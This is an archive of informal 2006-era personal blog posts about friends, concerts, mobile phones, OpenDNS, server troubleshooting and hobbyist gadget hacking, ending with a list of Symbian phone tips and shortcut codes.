<p>So in weird internet news - i am no longer in the top 100 squidoo lensmasters. haha. based completely on my <a href='http://www.squidoo.com/hotgirls/'>hot girls</a> lens. i own. its still #21. but fadeing fast. oh the internet..</p>

<p>Speaking of the internet. here is an idea i have. A basic database of things that tell you what they are about. For instance. i always want to know what happens in a movie but i don&#8217;t want to watch it. so i was thinking - this site would have the plot. jsut the plot(all the spoilers. and good shit - but very little opinion). Could be a wiki. or something like that. but it could have a lot of things.. books, songs, movies, tv shows. just telling what its about. not more. 500 words or less. MAKE IT. i want to use it.</p>

<p>Its raining crazy like. thunder is shaking my house</p>

                <a href='http://apnews.myway.com/article/20060714/D8IROI9G0.html'>This</a>
<p>Last night i was hanging out with a bunch of friends of mine - and as per the strange usual - i was hanging out with some friends of mine that are arab. It was interesting to hear their anger at seeing their homeland being destroyed by a trigger happy (why are all the countries like cowboys) conflict. I am conflicted(as i imagine most unreligious white generic americans are), ever since i was little it seemed like israel was in the right - based on the support by our government and whatnot. however.. I don&#8217;t think israel is right to attack the &#8220;middle east.&#8221; I do think that justice is deservered, however at what cost. World War 3? stratifying the world more? destroying all the work that lebanon and co have tried to do? It seems totally fucked.</p>

<p>the thing that really frustrates me is how the US is breaking the UN peace process by disagreeing with the entire world on this issue. Why are they vetoing UN resolutions to end israeli attacks in gaza. why are we supporting terrorists? why is the world(UN) supporting the people that our government is saying our terrorists?</p>

<p>i just hope it stops soon. I don&#8217;t want iran to engage israel. I don&#8217;t want israel to engage syria. i don&#8217;t want the us to engage anyone. i don&#8217;t think it would end well.</p>

                <p>This is a followup to the <a href='http://www.nata2.org/2006/07/10/opendns/'>post</a> about openDNS from July 10th. So <a href='http://www.skinnycorp.com'>we</a> used <a href='http://www.opendns.com'>openDNS</a> for a couple days. It worked really well. Then it failed. We were all trying to do something and no one in the office was having DNS issues. So we rolled it back.</p>

<p>I think if there were a couple more servers - or it was distributed a bit more i would be more apt to use it in this &#8220;enterprise&#8221; way. However, until then it will be on a per-user basis.</p>

<p>So reading about(i say that as if i was puttering about) on the internet about the <a href='http://www.opendns.com'>openDNS</a> thing and it seems that the biggest complaint is that their is one place which desides what is a &#8220;good or bad&#8221; site. I think that this is a very very valid issue - and one that could be very easy to poison. It would suck if <a href='http://www.opendns.com'>openDNS</a> became wide spread and then an exploit came about to poison the &#8220;phishing DB&#8221; so that your site was denial of serviced in an ultimate way.</p>

<p>One of my personal complaints about <a href='http://www.opendns.com'>openDNS</a> was the invalid domain page. wtf. everytime i typed in a domain that was wrong i thought that i had hit a spammer page. it was pretty confusing. I guess i was looking for something much more clear.</p>

<p>I would like to see how the <a href='http://www.opendns.com'>openDNS</a> service turns out when you can configure some of these &#8220;features&#8221; in an <a href='http://www.opendns.com'>openDNS</a> control panel. i think seeing the granularity of the config will really make up my mind. It is a pretty awesome idea - i plan to hook it up at my moms house. which in my world says something. the mom test is the most important. that is why she has a mac, wears a helmet and is only allowed to leave the house on tuesdays and thursdays (just kidding about the mac mom.. heh).</p>

                <p>So for awhile i have been paying attention to the <a href='http://www.bape.com/'>BAPE</a>/<a href='http://www.zugara.com/bbc/'>BBC </a>phenomona that is invading hiphop. I guess i should say it has invaded hiphop. Anyway. I have admired the all over print, crazy foil, insane patterned hoodies and shirts for far too long. I am going to try and acquire some stuff that is insane. INSANE i tell you.</p>

                <p>I just put <a href='http://www.opendns.com'>openDNS</a> into place at <a href='http://www.skinnycorp.com'>skinny</a>. It is a neat DNS &#8220;replacement&#8221; that is a bit more intelligent than regular DNS. it apparently checks for phishing and notifies the user that they are going to a &#8220;phishing site.&#8221; This is pretty cool stuff - however i am worried about who chooses the phishing sites. I mean, what if they become a bit more vigilant and start blocking &#8221;<a href='http://nata2.info/?path=misc%2Ftextfiles'>hacking sites</a>&#8221; or &#8221;<a href='http://nata2.info/?path=pictures%2FIncoming&img=screenshot_BLOCKED.jpg'>sites deemed inappropriate?</a>&#8221; scary! i kinda wish it wasn&#8217;t so effective as to completely blind the user to the phishing attempt. However - i totally see this being great for someone like my <a href='http://reedbooks.org'>parents</a> or my apt. people who don&#8217;t really want to worry about DNS or all that crap.</p>

<p>One of the other cool features of openDNS is that it has a nice domain level spell checking. so if you mispell <a href='http://nata2.org'>nata2.org</a> as <a href='http://nata2.og'>nata2.og</a> it will redirect you to nata2.org. haha. awesome.</p>

<p>even though it is really cool and potentially very very helpful for not as savvy internet users i am still a bit freaked out by the control that <a href='http://www.opendns.com'>openDNS</a> has over what i view. I guess though that all DNS servers have that control -but that <a href='http://www.opendns.com'>openDNS</a> is overt about its use of the DNS system for good.</p>

<p>Well. i will of course chronicle how it goes..</p>

                <p>Woah. I am so damned tired. I slept a LOT today. Like nap after nap after nap. and no actual rest. So this weekend was nuts. First off it was intonation festival weekend. I usually HATE festivals but intonation is often fun and full of good bands. I wasn&#8217;t going to go - but <a href='http://www.tommiesunshine.com'>tommie</a> is in town and had passes - so i was able to stop by. I saw the boredoms, ghostface killer, the streets and lady soverign. It was pretty awesome - but last year was better. it was more fun just to hang out with friends and whatnot - then actually see the bands.</p>

<p>Then today. i juggled with matiss for some alderman in the pride parade. It was 2.4 miles of juggling death. So so so hard. haha. my body is telling me that it has giving up and is going to sleep while we are typing. i am controlling my fingers by will alone. its annoying.</p>

<p>My brother said he liked this design - but that it made me look like a pussy. hahaha. i told him to stfu. and then punched him over the internet. but whatever. i like how it looks.</p>

<p>some crazy thing are afoot. i am sure all of yall will find out more later. but stay tuned. excitment. !!</p>

<p>goodnight. sleep well.</p>

                <p>so i accidently spent like 100 hours in the last month reading this goddamn scifi series. It was super annoying. really good stuff. but a really bad author. well not really bad. but not very good. all the reviews said that when reading the series - you can&#8217;t wait a very long time between books because the plot is so thin. so true. but the story is great. but now i am done. and really pissed. haha.</p>

<p>Also. i purchased 15 books on the 17th of may and i have finished 13 and its the barely been one month.</p>

<p>i like reading. i think it is the one thing that i do that totally circumvents anything else. i think i would sell my brother for some time with a good book - and i am sure he would do the same. hah</p>

<p>i am going to play computer some more. and hopefully make my site look a little better. it is rough now.</p>

<p>ok.</p>

<p>however - i have been slowly thinking about redesigning nata2. so now you get to see my first draft. kind of a rough veiw. i like the idea. but i need to fix it. hah. right now nothing works but the home page. accidently some other stuff may work. but don&#8217;t trust it. its a sham.</p>

<p>someday. probably tomorrow. i need to talk to all my friends and see what they suggest. if anyone has any suggestions or critique. let me know.</p>

                <p>So hiromi got here monday. it has been really fun.</p>

<p>On monday I picked her up and we hung out around my house. Went to our friend becca&#8217;s house and hung out. It was fun. After that we went home - picked up chris - went to irazu and then went to the empty bottle to see becca&#8217;s husband&#8217;s band &#8221;<a href='http://www.asianmanrecords.com/bands/jus.html'>just a fire</a>.&#8221; It was good - but hiromi about died from jet lag. So we hurried home and went to bed.</p>

<p>Then on tuesday hiromi came and had lunch with me at the <a href='http://metromix.chicagotribune.com/search/43857,0,1932948.venue'>Taste of Lebanon</a>. Then she made a really nice dinner. It was awesome. Then we went to see the movie &#8221;<a href='http://imdb.com/title/tt0452594/'>the break-up.</a>&#8221; It was ok. Sad and weird. but fun that it was in chicago.</p>

<p>Yesterday Hiromi hung out with becca more. I went to a tmobile party where i won a <a href='http://www.t-mobile.com/shop/Phones/Detail.aspx?device=8802ddeb-1ee4-477a-9608-d9cd1e2a903f'>T-Mobile MDA</a>. Hah. We then met up and went to <a href='http://metromix.chicagotribune.com/search/29753,0,2391699.venue'>Le Colonial</a> for dinner. It was really tasty. After that we met up with jordan and the aoki crew over at victor hotel. Then we cruised and hung out with the wabi/softball crew at tumans.</p>

<p>It was a nice night.</p>

<p>So this phone. It looks really cool. The form factor is nice. Pretty small. Pretty good looking phone over all. The keyboard seems hearty enough - probably annoying after awhile, but pretty cool. I think it would be a great phone to have if you used only windows products (like outlook and whatnot). It has word and all that. pretty cool. Nifty really. I think the real key is the wifi. That way you can get good internet speeds for chatting and whatnot when you are in those areas. It would rule. People really seem to like it though.. check out this <a href='http://www.coolsmartphone.com/article479.html'>MDA review</a>.</p>

<p>However.. I don&#8217;t like windows and i don&#8217;t like the form factor of the phone. What i want is the <a href='http://www.europe.nokia.com/nokia/0,,81718,00.html'>Nokia e61</a> or<a href='http://europe.nokia.com/nokia/0,,81338,00.html'> Nokia e60</a>. Probably the e61. I like the form factor of the e61. I was all about the e60 for a minute - but then i started to think about it. I am not all that interested in another candy bar phone. The goal of this is not to replace my current phone. but to have a new wifi phone with browser/messaging capibilities. Thus the nokias.</p>

                <p><img src='http://static.flickr.com/35/155394097_11e312e488_m.jpg' align='right' />So this weekend was pretty fun. It was god damned hot and full of events. On friday i went out to dinner with matiss (since he was moving out on saturday) and chris. we went to <a href='http://metromix.chicagotribune.com/search/42962,0,1670800.venue'>bouna terra</a>. It was good and we had a ncie dinner. After dinner i ran into bunches of friends and eventually made it to the SUNN 0))) show at the logan. Pretty awesome. I took a bunch of <a href='http://www.flickr.com/photos/natatwo/sets/72157594146383496/'>pictures</a> and some video(<a href='http://youtube.com/watch?v=0KkUfg0Pdek'>1</a>,<a href='http://youtube.com/watch?v=813esokcFRE'>2</a>,<a href='http://youtube.com/watch?v=GfoDIUwDYcI'>3</a>,<a href='http://youtube.com/watch?v=sJWx_W3iuYw'>4</a>). I got really tired of SUNN0))) after awhile - but it was really nice. I am glad kira grabbed tickets.</p><p>On saturday i slept a bunch and matiss moved out. That is really weird. I have lived with since 2000 and it has been the most successful living arrangment i have yet to have. Fun, entertaining, convienient, easy and healthy. I am going to miss him quite a bit. But i am excited - cuz i almost think that we may hang out more since he is living away. We will be able to chill again. just last night we went to see X-Men (more on that later :P). anyway...<br />
So on saturday i went t this awesome birthday party for my friend John. It was really fun. I hung out with a bunch of people i hadn't seen in a long time and a bunch of people i hadn't met. I like meeting new people. I always forget. It was great. There are some pictures of the evening <a href='http://www.flickr.com/photos/starart/sets/72157594148321628/'>on flickr</a>. While at the party i got to discussing flickr with some flickrheads and we talked about the new flickr look and photo views. Most of the people didn't like the new flickr. I have to agree with them. Its annoying. I have a hard time navigating to simple things like my tags or my "activity page." i know they are there - they are just so buried under those annoying menus that it is hard to find it. I find myself typing in the url from memory rather than clicking. annoying.</p><p>We also talked about flickr photo views and how as i eclipse 100k photo views it is apparent that i have totally exploited the whole tagging, folksonomy and group system to raise my photo views. I mean its valid. I didn't cheat really. People just want to see porn. and my most popular pictures are of hot club girls. i can't be helped.</p><p>Anyway - the party was awesome and we ended up taking a <a href='http://www.youtube.com/watch?v=AUoaZsvvGIs'>video of a bidet</a>. totally sober. totally... sober.</p><p>Then on sunday. i went to a bbq and then generally "out."  I saw scotts band <a href='http://www.youtube.com/watch?v=AUoaZsvvGIs'>american heritage</a> at the Note. It was awesome. I was very happy that his band was good. Nothing is worse then trying to explain to friend that "i really 'liked' your stuff" when their band sucks. Amjad was in the hood and was our ride so we had to sadly split early from the show. We then hit up Na'el (amjad's brother) at his studio and probably freaked out some suburban parents. I was of course rocking my Dance shirt and looking crazy as always. After that we hit up dannies then crobar for a night of messy drinking. fun fun.</p><p>On monday i was detirmined to work on some stuff - but instead spent most of the day debugging my router and internet. It was stupid.</p><p>Then i saw xmen. Xmen was ok. kinda stupid. but the best part with when juggarnaut referenced those dudes who made the jugarnaut bitch movie. that was awesome. and well worth the money.</p><p>i am going home soon to read scifi and get roommates.</p><p>Oh and hiromi is coming soon. i am very excited.

                <p>Man today sucked. Seriously. I haven&#8217;t had a BAD day in years. today. today was a bad day. I woke up and got in the shower. Got dressed. check my email. checked my text messages. and i had a txt from my buddy mike telling me my server was broke. so i checked it out. i couldn&#8217;t ssh into it or anything - which is very very unusual. I have never been able to not connect at all. and usually a web server or something.. but never the firewall. wtf. so i called and had them reboot it. took a cab to work. and nothing. it was totally totally toasted. so i called them again and we went through a bunch of stuff. finally i detirmined that i was totally fucked. So my friend tony helped me debug some stuff and finally i gave up. i was looking for plane tickets to columbus when tony found this <a href='http://owlriver.com/'>dude in columbus</a> that does <a href='http://owlriver.com/sysadmin/?'>unix support</a>. He came in and for a little bit of money really rocked the place and fixed her up.</p>

<p>So then i worked for the next 6 hours on debugging the firewall script which apparently caused it to break. what was interesting was that i hadn&#8217;t reboot the server since i installed it. something like 450 days. man that is a good amount of uptime. i am really sad that i had to trash it though. now it is back and i feel 1000% better. hopefully the day gets better exponentially after this.</p>

<p>eep.</p>

<p>ok. i need a drink.</p>

                <p>This weekend was pretty nice. I went to colorado to help my dad with his webpage, visit my family and for mothersday. I always forget how pretty it is in colorado. I am always a bit surprised when i see the mountains or the sunset. Also the <a href='http://flickr.com/photos/natatwo/145761074/'>weather is so nice</a>. a lot nicer than chicago. Especially this weekend.</p>

<p>I got in late on friday and i just ate easy mac, slept and read a bit. Then on saturday i got up early and went to my dads business and got some info about their site. Then i met up with my brother and we had a nice lunch at wendy&#8217;s. For the afternoon i napped, read a bit and played computer for a minute. That afternoon i helped my <a href='http://flickr.com/photos/natatwo/145775538/'>father</a> do some <a href='http://flickr.com/photos/natatwo/145756712/'>yardwork</a>. It was fun. Basically i just stood there postulating about the neighbors. hah. After that, my mom, dad and I went to <a href='http://www.meltingpot.com/'>Melting Pot</a> for <a href='http://flickr.com/photos/natatwo/145933684/'>fondue</a>. It was really good. During our meal <a href='http://hirominakazawa.com'>hiromi</a> called so my parents were able to chat with her for a second. It was nice. It was fun to talk and hang out. Then on sunday we had a <a href='http://flickr.com/photos/natatwo/146407893/'>nice meal</a> celebrating mothers day. Dylan was able to make it and, as per usual, was dressed like a clown. Pretty sweet.</p>

<p>Then we watched <a href='http://imdb.com/title/tt0375679/'>crash</a>. That is a rough movie. I liked it a lot - but found it to be quite stressful. I wasn&#8217;t really interested in being so stressed but it was nice. I also finished my <a href='http://www.amazon.com/gp/product/0312856849/sr=8-1/qid=1147723641/ref=pd_bbs_1/102-1931212-2834515?%5Fencoding=UTF8'>first book</a> of my set of 1 million books i got. heh.</p>

<p>I then barely made it home. ;) but i did. and now i am here.</p>

<p>It was a great quick weekend. As usual, i am constantly reminded of how <a href='http://flickr.com/photos/natatwo/145753670/'>weird and funny</a> my <a href='http://flickr.com/photos/natatwo/145661121/'>brother</a> is. Sadly, <a href='http://photodork.org/'>sarah</a> was a bit under the weather and i didn&#8217;t get to see her. next time!</p>

                <p>I have been using ubuntu for a minute here while i compile some software for use on my soekris box at work. I am attempting to move from the <a href='http://nycwireless.net/pebble/'>old pebble linux</a> to the new <a href='http://pyramid.metrix.net/FrontPage'>pyramid </a>linux made by the <a href='http://metrix.net/metrix/'>metrix guys</a>. Its pretty dope so far. a lot more modern, but sadly not mature. I need to compile in PCMCIA support and whatnot. a real pain ;)</p>

<p>I did find a hint for one of my initial problems while building out the <a href='http://pyramid.metrix.net/FrontPage'>pyramid</a> <a href='http://pyramid.metrix.net/BuildEnvironment'>build environment</a>.</p>

<p>Since we don&#8217;t have any linux boxes laying around, i have been doing most of my work in VMWARE. Which rules - especially because i can download the player and then a ubuntu image and have every thing be kosher. However, ubuntu is seemingly installed to be based off of a CD. so i kept getting this error about inserting a cdrom when i was attempting to do a apt-get install. it was annoying. <blockquote>Media change: please insert the disc labeled
'Ubuntu 5.10 _Breezy Badger_ - Release i386 (20051012)'
in the drive '/cdrom/' and press enter</blockquote> I ended up stumbling upon <a href='http://crschmidt.net/blog/categories/technology/planet-planet/'>this guy</a> who had come across a similar issue and posted a really easy solution for it.</p>

<p>Basically you just comment or remove the line in your /etc/apt/sources.list. Then apt-get update and apt-get install your way to freedom.</p>

<p>I will post more later when i am successful or not. ;)</p>

                <p>I am waiting for my flight. my family left to colorado about 30 minutes ago and my flight is delayed until 8:00. sad. only 4 hours. i thought it would be a good opportunity to go and find a book to read in the bad airport book stores. sadly there was NO interesting books. Only dan brown, steven king, michael crichten and john grisham. Those dudes must be novel factories. I mean i know dan brown has defined a formula and is just pumping out books following the same &#8220;basic&#8221; plot - and i assume those other authors have as well. But wtf, why can&#8217;t the airport book store carry something interesting to me. hah.</p>

<p>So anyway. this weekend ruled. i have posted my pictures to my <a href='http://flickr.com/photos/natatwo/'>flickr</a>. you can check out the set here: <a href='http://flickr.com/photos/natatwo/sets/72057594129393809/'>Jon's Graduation</a></p>

<p>It started monday morning when i called charlie and was like &#8220;you in - word. i am in.&#8221; He showed up and we went to the division and ashland intersection. There was the nearest meetup to start the parade. We then walked with everyone to union park. and hung out for awhile. and from there we walked down randolph and then another street. Hah.</p>

<p>Sadly we had to go around 1pm so we had to split once we reached michigan.</p>

<p>I took a movie and will be posting it after the jump. Check it out. I have posted all my pictures on flickr. Check them out <a href='http://www.flickr.com/photos/natatwo/sets/72057594122367015/'>here</a>.</p>

<p>Check it out. Let me know if there are additions or changes. Honestly i just wanted to get it out there. If someone wants admin access - let me know.</p>

<p>Also. I will be at The Stevenson Fest if anyone wants to meet up.</p>

                <p>I was talking to my &#8220;phone connection&#8221; and it looks as though the nokia N80 is out in the wild. You can check it out <a href='http://www.welectronics.com/gsm/Nokia/Nokia_N80.HTML'>here</a>. The N80 seems like a <a href='http://www.symplification.com/node/333'>pretty cool phone</a>. it has all the features that one could possibly want - good camera, good os, good form factor and wifi.</p>

<p>I think for me the selling point is the wifi. Although on the N80 you are unable to use the phone as a VOIP SIP device, it would still be one of the coolest things ever. Being able to upload pictures and media very fast in wifi zones. and browsing the internet at work/home.</p>

<p>I think that the 3rd party programs would be the key. I have read that there is possibly a RSS reader, and probably a lot better IM support - maybe even <a href='http://www.skype.com'>skype</a>.</p>

<p>It would be awesome.</p>

<p>However, i am waiting for the <a href='http://www.google.com/url?sa=t&ct=res&cd=1&url=http%3A%2F%2Fwww.europe.nokia.com%2Fnokia%2F0%2C%2C81338%2C00.html&ei=xe1OROu6IL-CigHuoITuCw&sig2=_19jgHqQpGoGv1jbYL3QIw'>E60</a> or something more similar to my phone that does support VOIP SIP. That way i can retire my <a href='http://www.utstar.com/Solutions/Handsets/WiFi/'>starcom UT F1000</a> from the situation. Luckily none of this happens soon - so i don&#8217;t have to drop the 500 dollars until june or july.</p>

                <p>I used this <a href='http://googlesystem.blogspot.com/2006/04/get-yahoo-mail-beta.html'>awesome trick</a> to get on the <a href='http://whatsnew.mail.yahoo.com/'>yahoo mail beta</a>. it is pretty cool. a nice rich interface for mail. I don&#8217;t like it as much as gmail - but it is really nice. I think gmail seems snappier - but it may just be the amount of color and &#8220;chrome&#8221; that yahoo man versus the minimal interface that gmail is offering.</p>

<p>If anyone would like to try out the beta themselves just follow these instructions: <blockquote>How to change your content preference:
<ul>
	<li>log in to Yahoo Mail</li>
	<li>click Options</li>
	<li>select Account information from the left panel</li>
	<li>go to Member Information, General Preferences, Preferred Content</li>
	<li>select, for example, Yahoo UK</li>
	<li>click Finished</li>
	<li>go to Yahoo Mail</li>
	<li>you'll see a page that says "It's the New Yahoo! Mail Beta... and you're invited."</li>
	<li>click on "Try Beta Now".</li>
	<li>Then do everything again but change your preferred content back to US</li>
	<li>Done!</li>
</ul>
</blockquote> So there. Not hard. It took me 5 minutes to switch to the beta. Check it out.</p>

                <p>So i am kinda tired. i have been sick for the last month. it is lame. First i thought it was just jetlag mixed with matiss&#8217;s germs from his sickness mixed with being in tokyo and then the US so fast. But then it never really ended - so i decided that i probably have/had a sinus infection and wouldjust have to fight it. So i went to the doctor. He was like &#8220;yea. your sinu sis inflamed.&#8221; so now i have to fulfill a prescription. whee. i hate that. i don&#8217;t know if i have ever really done it. only once i guess - when i went to india and had to take all those pills. anyway. i guess i need to go to the pharmacy.</p>

<p>i am suddenly not interested in blogging. i really need to get some work done.</p>

<p>i am really excited - hiromi is coming to visit in june. i need to figure out a way to get her back here.</p>

<p>stupid immigration laws. hah.</p>

                <strong>Hacking Stuff</strong>
<p>I quite enjoy manipulating and hacking stuff. It could a web application, learning AJAX or XSLT or taking apart the latest awesome consumer appliance. Ever since before college I have been interested in writing software, taking stuff apart and making new things. <div style='text-align: center'><!--adsense--></div> Here is a short history since 2001 of stuff that I have been concertrating on hacking or manipulating. <ul>
	<li><strong>2006</strong> ~ We shall see...</li>
	<li><strong>2005</strong> ~ <strong>Play Station Portable</strong> - Having seen the jakes PSPs while working on squidoo, i was impressed with what they were able to do with them. So i went and bought a couple: One that was version 2.0 and one from a friend that was versino 1.5. I was able to test the new exploits and version changers on the version 2.0 one; while still being able to use home brew and other awesome stuff on the 1.5.</li>
	<li><strong>2004 </strong>~ Can't remember. I think it was clubbing or something a bit more temporal.</li>
	<li><strong>2003 </strong>~ <strong>Direct TV Tivo</strong> - Having purchased a Direct Tv Tivo i needed to expand it and get ssh and such so i could "use" the tivo as much as i could. Really all i did was make it so we could Tivo every simpsons episode ever. I was able to get injecting and removal of media into and out of the TIvo - but it just wasn't very helpful for our household. Here is my <a href='http://demon.dopeman.org/directivo/index.php/Main_Page'>directivo wiki</a>.</li>
	<li><strong>2004 </strong>~ <strong>Playstation 2 </strong>- I did a bunch of work to make my roommates free playstation work much better. We didn't pirate games cuz that was lame and we didn't care. Here is my <a href='http://www.nata2.org/2004/09/15/playstation-2-hacking-2/'>blog post</a>.</li>
	<li><strong>2003 </strong>~ <strong>Direct TV</strong> - I was working with smart cards and investigated the direct tv smart card. It was interesting.</li>
	<li><strong>2002 </strong>~ <strong>Sprint Samsung A500</strong> - Using the formula I derived from the Audreyhacking.com success, i started another site called <a href='http://www.nata2.org/2002/09/09/a500hackingcom/'>a500hacking.com</a> dealing with the first of the "3g" phones from sprint. The Samsung A500 was a really nice phone that was color and had good connectivity. We read all over the internet to find information on how to extend and use ALL of the features of the A500.</li>
	<li><strong>2001 </strong>~ <strong>3Com Audrey</strong> - I was involved with sowbug and the audrey hackers on a community I created called <a href='http://www.audreyhacking.com'>audreyhacking.com</a>. It was a great success and we ended up breaking the Audrey wide open. In 2001 I received an Honorable mention from the Ars Prix Electronica board for <font size='-1'>Net Vision. It was an awesome community and is still going on.</font></li>
	<li><strong>2000 </strong>~ <strong>Dreamcast</strong> - Using some of the great hacks from the homebrew dreamcast teams, I was able to play awesome games my senior year of college. We downloaded and tested hundreds of games, and strangely only played tony hawk, NFL Blitz and some roll playing game; only games we actually purchased. Hah.</li>
	<li><strong>1999 </strong>~ <strong>Lego Mindstorm</strong>s - When the lego mindstorms lego robotics set came out I was quite excited. I created some great robots - including a biped, a scanner and a bunch of small robots that used sonor. Legos are awesome.</li>
</ul> <strong>Projects</strong></p>

                <p>My friend jacob got a Nokia 3250 on my recommendation and was disappointed that it didn&#8217;t have as many apps as my N70 did. So while scouring the internet and looking for applications for him i decided that i would create an application list for the Symbian 3rd edition phones. <div style='text-align: center'><!--adsense--></div> Here it goes: <ul>

<p align='left'>So now that everyone is finally interested in getting a symbian phone - i decided to unearth some tricks and what not for symbian phones.</p>

<div align='left' />
<p align='left'>I have tried most of these. I am not quite sure where i got this list - probably from some yahoo group or some site years ago when i got my 7610. Most of it works on my N70 so it should all be still current.</p>
</div><div style='text-align: center'><!--adsense--></div><strong>Tip 1 -  Do you know how to use the edit button (abc or pencil button)?</strong>
<p>Heres how&#8230; in the inbox for example; you wanna delete multiple SMS, simply hold the edit button, scroll down, and then, press c to delete the marked SMS. The edit button can also be used to copy and past text in SMS, simply hold it and scroll across, choose copy.</p>
<strong>Tip 2 -  How to reset your password</strong>
<p>Press <em>#7370#, then enter the lock code, which is the sec code of the phone. NOTE: battery must be full, else if format is disrupted by low battery, consequences will be disastrous</em></p>

<p>for 6600 users, to format the phone, theres an alternative way. Press and hold <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;3&gt;, </pre></p>
<strong>Tip 3 - installing .sis files simply using the cable</strong>
<p>Just plug it in, place the .sis file anywhere on e: (the MMC), not in any folders, root of e:, disconnect, then look for it in manager.</p>
<strong>Tip 4  Task Menu</strong>
<p>Save on battery and system memory being used by regularly checking the task manager which can be accessed by holding down the menu button!!</p>
<strong>Tip 4a</strong><strong>Tip 4b</strong><strong>Tip 5  IMEI Number</strong>
<p>Type <em>#06# to display your IMEI serial number, very valuable for the unlocking your phone to other sim cards</em></p>
<strong>Tip 6  Firmware Version</strong>
<p>Type <em>#0000# to view which firmware version you are running</em></p>
<strong>Tip 7  Avoid being bluejacked</strong>
<p>If you would like to avoid being &#8220;blue jacked&#8221;, keep bluetooth turned off, or set your phone&#8217;s visibility to hidden.</p>
<strong>Tip 8 -  Make your phone a watch</strong>
<p>Don&#8217;t want to carry a watch and a phone? Set the screen saver to show date and time, then you can ditch the watch.</p>
<strong>Tip 9  Save memory while installing apps</strong>
<p>Save memory when installing apps, by installing over bluetooth. This can be done using the nokia phone suite and a bluetooth serial connection. Only works with .SIS files, so java still has to be sent to the phone, but will save space when using .SIS files.</p>
<strong>Tip 10 - Operator logos</strong>
<p>Use a filemanager like FExplorer or SeleQ to add the folders: &#8220;c:/system/Apps/phone/oplogo&#8221;. Add a .bmp picture to folder &#8220;oplogo&#8221; and restart your phone! The .bmp picture size needs to be: 97 x 25 pixels</p>
<strong>Tip 11 - Check if the recipients phone is on</strong>
<p>Delivery reports or Type <em>0# your message in the message composer window space then write your message, the recipient will not see the star zero hash bit - just the message When they read it it will relay a message back to your phone showing the time they received it. (haven&#8217;t yet tried it myself though)</em></p>
<strong>Tip 12 - BlueJacking</strong>
<p>First up, you need to know what Bluetooth is. There are lots of types of modern devices that incorporate Bluetooth as one of their many features. PDAs, mobile phones and laptops are a few of these modern devices. Bluetooth means that Bluetooth enabled devices can send things like phonebook/address book contacts, pictures &amp; notes to other Bluetooth enabled devices wirelessly over a range of about 10 metres. So, we&#8217;ve got past the boring part. Now, using a phone with Bluetooth, you can create a phonebook contact and write a message, eg. &#8216;Hello, you&#8217;ve been bluejacked&#8217;, in the &#8216;Name&#8217; field. Then you can search for other phones with Bluetooth and send that phonebook contact to them. On their phone, a message will popup saying &#8220;&#8216;Hello, you&#8217;ve been bluejacked&#8217; has just been received by Bluetooth&#8221; or something along those lines. For most &#8216;victims&#8217; they will have no idea as to how the message appeared on their phone.</p>
<strong>Tip 13: Gallery Shortcut Keys</strong>
<p>While you are viewing a picture in your phone&#8217;s gallery, press one of these shortcut keys (definitely works on 6600, not sure about other symbians) 1 - turn image anticlockwise 3 - turn image clockwise * - toggle on/off of full screen 5 - zoom in 0 - zoom out</p>
<strong>Tip 16:  A soft and Hard reset</strong>
<p>A Soft-reset - the process of resetting all the settings of the phone to the factory default! No applications are deleted! A Hard-reset is like formatting a drive! It does format the memory. Everything that has been installed after the first use of the phone is deleted! It will recover the memory of the phone to the state you purchased it! It is done by inputing the following code: <em>#7370# NOTE: The battery must be full or the charger has to be connected to the phone so that it does not run out of power and make the phone unusable.</em></p>
<strong>Tip 17: Formats of images</strong>
<p>supported ones: JPG UPF GIF87a/89a WBMB MBM TIFF/F PNG EXIF How to copy &amp; paste text in your Nokia 3650: Press and hold the pencil key and select your text using the scroll key. Left function key will change to &#8216;Copy&#8217;. Press it to copy the selected text to clipboard. You can paste the clipboard contents the same way: press and hold the pencil key and press &#8216;Paste&#8217;. Or, press pencil key once and select &#8216;Paste&#8217;. Press and hold the Menu key to open the application switching window, where you can <em>duh</em> switch between applications.</p>
<strong>Tip 18: Hanging Program</strong>
<p>If a program hangs and you can&#8217;t shut it down, select the application in the application switching window and press &#8216;C&#8217; to kill it. It&#8217;s also a faster way to exit programs.</p>
<strong>Tip 19: Quiet your camera shutter</strong>
<p>Turn on/off the &#8220;click&#8221; sound made by the camera by selecting the &#8216;Silent&#8217; profile or by turning warning tones on/off:</p>

<p>Menu &gt; Profiles &gt; &#8220;select your activated profile&#8221; &gt; Personalize &gt; Warning tones &gt; On/Off. (This also effects the sound of Java games and apps). <div style='text-align: center'><!--adsense--></div> <strong>Tip 20: Background Image</strong> To change background image go to: Menu &gt; Tools &gt; Settings &gt; Phone &gt; Standby mode &gt; Background image &gt; Yes &gt; &#8220;choose an image&#8221;. The best size for background images is 174x132 pixels.<strong>Tip 21: Contact Image</strong> Display an image when someone&#8217;s calling: Menu &gt; Contacts &gt; &#8220;select a contact card&#8221; &gt; Options &gt; Edit &gt; Options &gt; Add thumbnail &gt; &#8220;choose an image&#8221;.</p>
<strong>Tip 22: Contact Ringtone</strong>
<p>Add a personal ringing tone to a contact: Menu &gt; Contacts &gt; &#8220;select a contact card&#8221; &gt; Options &gt; Open &gt; Options &gt; Ringing tone &gt; &#8220;choose a ringing tone&#8221;.</p>
<strong>Tip 23: Delete all messages in your inbox</strong>
<p>Delete all messages from your Inbox at once: Menu &gt; Messaging &gt; Inbox &gt; Options &gt; Mark/Unmark &gt; Mark all &gt; Options &gt; Delete.</p>
<strong>Tip 24: Hide Caller ID</strong>
<p>Send or hide your caller ID: Go to: Menu &gt; Tools &gt; Settings &gt; Call &gt; Send My Caller ID &gt; &#8216;Yes&#8217;, &#8216;No&#8217; or &#8216;Set By Network&#8217; to follow the default settings of your home network.</p>
<strong>Tip 25: Copying large files?</strong>
<p>If you often copy large files to your MultiMedia Card, I recommend a card reader. <em>E.g.</em> With a card reader it takes only 12 seconds to copy a 10 MB file!</p>
<strong>Tip 26: Record a phone call</strong>
<p>Record the sound of a phone call using the (sound) Recorder. Menu &gt; Extra&#8217;s &gt; Recorder &gt; Options &gt; Record sound clip. Note: short beeps are audible during call registration. But there is a 60 second limitation so if you want unlimited sound recording get this app: Extended Recorder.</p>
<strong>Tip 27: Switch dictionary On/Off</strong>
<p>While writing text, press &#8221;#&#8221; to switch between upper and lower case and Dictionary on/off (predictive text input).</p>
<strong>Tip 30: Switch between alpha and numeric mode</strong>
<p>Press and hold &#8221;#&#8221; to switch between Alpha mode and Number mode.</p>
<strong>Tip 31: Keyboard shortcuts for zooming and rotating images in Images:</strong>
<p>1 = zoom in 0 = zoom out, press and hold to return to the normal view 2 = rotate anticlockwise 9 = rotate clockwise * = full screen</p>

